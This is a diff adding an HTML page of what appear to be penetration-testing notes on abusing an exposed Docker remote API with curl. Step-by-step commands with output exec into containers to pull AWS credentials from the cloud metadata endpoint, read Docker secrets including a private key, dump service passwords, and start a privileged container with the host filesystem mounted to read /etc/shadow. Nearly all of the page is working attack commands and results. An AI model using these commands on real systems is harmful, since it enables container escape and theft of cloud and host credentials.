@@ -1,0 +1,131 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Access API With CURL</title>
+</head><body>Using curl to hit the API<br/>
+<br/>
+Sometimes you'll see 2376 up for the TLS endpoint. &nbsp;I haven't been able to connect to it with the docker client but you can with curl no problem to hit the docker API.<br/>
+<br/>
+<b>Docker socket to metadata URL</b><br/>
+https://docs.docker.com/engine/api/v1.37/#operation/ContainerExec<br/>
+<br/>
+<b>list containers</b>:<br/>
+curl --insecure https://tls-opendocker.socker:2376/containers/json | jq<br/>
+<br/>
+<b>List processes in a container:</b><br/>
+curl --insecure https://tls-opendocker.socker:2376/containers/f9cecac404b01a67e38c6b4111050c86bbb53d375f9cca38fa73ec28cc92c668/top | jq<br/>
+<br/>
+<b>Set up and exec job to hit the metadata URL</b>:<br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/blissful_engelbart/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "wget -qO- http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance"]}'<br/>
+<br/>
+{"Id":"4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55"}<br/>
+<br/>
+<b>Get the output</b>:<br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/4353567ff39966c4d231e936ffe612dbb06e1b7dd68a676ae1f0a9c9c0662d55/start -d '{}'<br/>
+<br/>
+{<br/>
+&nbsp; "Code" : "Success",<br/>
+&nbsp; "LastUpdated" : "2019-01-29T20:12:58Z",<br/>
+&nbsp; "Type" : "AWS-HMAC",<br/>
+&nbsp; "AccessKeyId" : "ASIATRSNIP",<br/>
+&nbsp; "SecretAccessKey" : "CD6/h/egYHmYUSNIPSNIPSNIPSNIPSNIP",<br/>
+&nbsp; "Token" : "FQoGZXIvYXdzEB4aDCQSM0rRV/SNIPSNIPSNIP",<br/>
+&nbsp; "Expiration" : "2019-01-30T02:43:34Z"<br/>
+}<br/>
+<br/>
+<b>Docker secrets</b><br/>
+https://docs.docker.com/engine/swarm/secrets/<br/>
+<br/>
+<br/>
+<b>list secrets (no secrets/swarm not set up):</b><br/>
+curl -s --insecure https://tls-opendocker.socket:2376/secrets | jq<br/>
+{ "message": "This node is not a swarm manager. Use \"docker swarm init\" or \"docker swarm join\" to connect this node to swarm and try again."}<br/>
+<br/>
+<b>list secrets (they exist)</b><br/>
+$ curl -s --insecure https://tls-opendocker.socket:2376/secrets | jq<br/>
+&nbsp;[<br/>
+&nbsp; {<br/>
+&nbsp; &nbsp; "ID": "9h3useaicj3tr465ejg2koud5",<br/>
+&nbsp; &nbsp; "Version": {<br/>
+&nbsp; &nbsp; &nbsp; "Index": 21<br/>
+&nbsp; &nbsp; },<br/>
+<br/>
+&nbsp; &nbsp; "CreatedAt": "2018-07-06T10:19:50.677702428Z",<br/>
+&nbsp; &nbsp; "UpdatedAt": "2018-07-06T10:19:50.677702428Z",<br/>
+&nbsp; &nbsp; "Spec": {<br/>
+&nbsp; &nbsp; &nbsp; "Name": "registry-key.key",<br/>
+&nbsp; &nbsp; &nbsp; "Labels": {} }},<br/>
+<br/>
+<b>Check what is mounted</b><br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "mount"]}'<br/>
+<br/>
+&nbsp;{"Id":"7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa"}<br/>
+<br/>
+<b>Get the output by starting the exec</b><br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/7fe5c7d9c2c56c2b2e6c6a1efe1c757a6da1cd045d9b328ea9512101f72e43aa/start -d '{}'<br/>
+<br/>
+<b>Cat the mounted secret</b><br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/e280bd8c8feaa1f2c82cabbfa16b823f4dd42583035390a00ae4dce44ffc7439/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /run/secrets/registry-key.key"]}'<br/>
+&nbsp;{"Id":"3a11aeaf81b7f343e7f4ddabb409ad1eb6024141a2cfd409e5e56b4f221a7c30"}<br/>
+<br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/3a11aeaf81b7f343e7f4ddabb409ad1eb6024141a2cfd409e5e56b4f221a7c30/start -d '{}'<br/>
+<br/>
+&nbsp;-----BEGIN RSA PRIVATE KEY-----<br/>
+MIIJKAIBAAKCAgEA1A/ptrezfxUlupPgKd/kAki4UlKSfMGVjD6GnJyqS0ySHiz0<br/>
+---SNIP---<br/>
+<br/>
+<b>If you have secrets, it's also worth checking out services in case they are adding secrets via environment variables</b><br/>
+curl -s --insecure https://tls-opendocker.socket:2376/services | jq<br/>
+<br/>
+&nbsp;[{<br/>
+&nbsp; &nbsp; "ID": "amxjs243dzmlc8vgukxdsx57y",<br/>
+&nbsp; &nbsp; "Version": {<br/>
+&nbsp; &nbsp; &nbsp; "Index": 6417<br/>
+&nbsp; &nbsp; },<br/>
+&nbsp; &nbsp; "CreatedAt": "2018-04-16T19:51:20.489851317Z",<br/>
+&nbsp; &nbsp; "UpdatedAt": "2018-12-07T13:44:36.6869673Z",<br/>
+&nbsp; &nbsp; "Spec": {<br/>
+&nbsp; &nbsp; &nbsp; "Name": "app_REMOVED",<br/>
+&nbsp; &nbsp; &nbsp; "Labels": {},<br/>
+&nbsp; &nbsp; &nbsp; "TaskTemplate": {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; "ContainerSpec": {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Image": "dpage/pgadmin4:latest@sha256:5b8631d35db5514d173ad2051e6fc6761b4be6c666105f968894509c5255c739",<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Env": [<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "PGADMIN_DEFAULT_EMAIL=REMOVED@gmail.com",<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <b>"PGADMIN_DEFAULT_PASSWORD=REMOVED</b>"<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ],<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; "Isolation": "default"<br/>
+<br/>
+<br/>
+<b>Creating a container that has mounted the host file system</b><br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket2376/containers/create?name=test -d '{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}'<br/>
+<br/>
+{"Id":"0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192","Warnings":null}<br/>
+<br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/start?name=test<br/>
+<br/>
+Read something from the host<br/>
+<br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/exec -d '{ "AttachStdin": false, "AttachStdout": true, "AttachStderr": true, "Cmd": ["/bin/sh", "-c", "cat /mnt/etc/shadow"]}'<br/>
+<br/>
+{"Id":"140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6"}<br/>
+<br/>
+curl --insecure -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/exec/140e09471b157aa222a5c8783028524540ab5a55713cbfcb195e6d5e9d8079c6/start -d '{}'<br/>
+<br/>
+root:$6$THEPASSWORDHASHWUZHERE:17717:0:99999:7:::<br/>
+daemon:*:17001:0:99999:7:::<br/>
+bin:*:17001:0:99999:7:::<br/>
+sys:*:17001:0:99999:7:::<br/>
+sync:*:17001:0:99999:7:::<br/>
+games:*:17001:0:99999:7:::<br/>
+<br/>
+<br/>
+<b>Cleanup</b><br/>
+<b>Stop the container</b><br/>
+curl --insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/0f7b010f8db33e6abcfd5595fa2a38afd960a3690f2010282117b72b08e3e192/stop<br/>
+<br/>
+<b>delete stopped containers</b><br/>
+curl --insecure -vv -X POST -H "Content-Type: application/json" https://tls-opendocker.socket:2376/containers/prune<br/>
+<br/>
+</body></html>
